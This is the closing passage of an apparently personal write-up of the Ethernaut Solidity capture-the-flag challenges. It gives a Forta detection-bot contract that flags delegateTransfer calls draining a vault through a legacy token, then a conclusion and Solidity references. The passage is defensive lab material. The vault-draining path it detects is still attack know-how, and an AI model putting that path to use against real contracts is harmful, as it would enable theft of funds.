import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/cec0800c541c809f883a37f2dfb91ec4c90263c5/contracts/access/Ownable.sol";
import "./IDetectionBot.sol";
import "./Forta.sol";
import "./CryptoVault.sol";

contract DetectionBot is IDetectionBot, Ownable {
    Forta public immutable forta;
    CryptoVault public immutable cryptoVault;

    constructor(address _forta, address _cryptoVault) Ownable() public {
        forta = Forta(_forta);
        cryptoVault = CryptoVault(_cryptoVault);
    }

    function handleTransaction(address, bytes calldata msgData) external override {
        bytes4 sig = bytes4(msgData[0]) | bytes4(msgData[1]) >> 8 | bytes4(msgData[2]) >> 16 | bytes4(msgData[3]) >> 24;
        bytes4 delegateTransferSig = bytes4(keccak256(abi.encodePacked("delegateTransfer(address,uint256,address)")));
        if (sig == delegateTransferSig) {
            (,,address origSender) = abi.decode(msgData[4:], (address, uint256, address));
            // A delegateTransfer from the vault is an attempt to transfer the underlying via
            // the legacy token. We must disallow this.
            if (origSender == address(cryptoVault)) {
                forta.raiseAlert(owner());
            }
        }
    }
}
```

Let's analyze the lines more closely.

The first step is to validate which function was called. We can check the first four bytes
of the message data against the expected signature for `delegateTransfer(address,uint256,address)`

```
bytes4 sig = bytes4(msgData[0]) | bytes4(msgData[1]) >> 8 | bytes4(msgData[2]) >> 16 | bytes4(msgData[3]) >> 24;
bytes4 delegateTransferSig = bytes4(keccak256(abi.encodePacked("delegateTransfer(address,uint256,address)")));
if (sig == delegateTransferSig) { ... }
```

After verifying the signature we can extract the `origSender` parameter and raise an
alert if it's the vault.

```
(,,address origSender) = abi.decode(msgData[4:], (address, uint256, address));
// A delegateTransfer from the vault is an attempt to transfer the underlying via
// the legacy token. We must disallow this.
if (origSender == address(cryptoVault)) {
    forta.raiseAlert(owner());
}
```

The only thing left is to register our bot with the Forta contract. You can do this with Remix!

And that completes the level!

# Conclusion
Wow, this was an incredible set of challenges for a beginner. I had fun, was challenged,
and learned a tremendous amount about Solidity development. I'm excited to continue my
journey through the dark forest :).

If you like this kind of content consider following [me](https://twitter.com/DaltonSweeney9) on Twitter where I often
(but not exclusively) tweet about crypto related things.

# Resources
[1] Receive and Fallback Ether Functions: https://docs.soliditylang.org/en/v0.8.13/contracts.html#receive-ether-function
[2] Function selectors: https://docs.soliditylang.org/en/v0.8.13/abi-spec.html?highlight=function%20signature#function-selector
[3] Solidity's selfdestruct function: https://docs.soliditylang.org/en/v0.8.13/units-and-global-variables.html#contract-related
[4] Ethereum JSON-RPC spec: https://playground.open-rpc.org/?schemaUrl=https://raw.githubusercontent.com/ethereum/eth1.0-apis/assembled-spec/openrpc.json&uiSchema%5BappBar%5D%5Bui:splitView%5D=true&uiSchema%5BappBar%5D%5Bui:input%5D=false&uiSchema%5BappBar%5D%5Bui:examplesDropdown%5D=false
[5] Checks -> Effects -> Interactions pattern: https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html
[6] ERC20 EIP: https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md
[7] Layout of State Variables in Storage: https://docs.soliditylang.org/en/v0.8.13/internals/layout_in_storage.html#bytes-and-string
[8] EIP-1967: https://eips.ethereum.org/EIPS/eip-1967

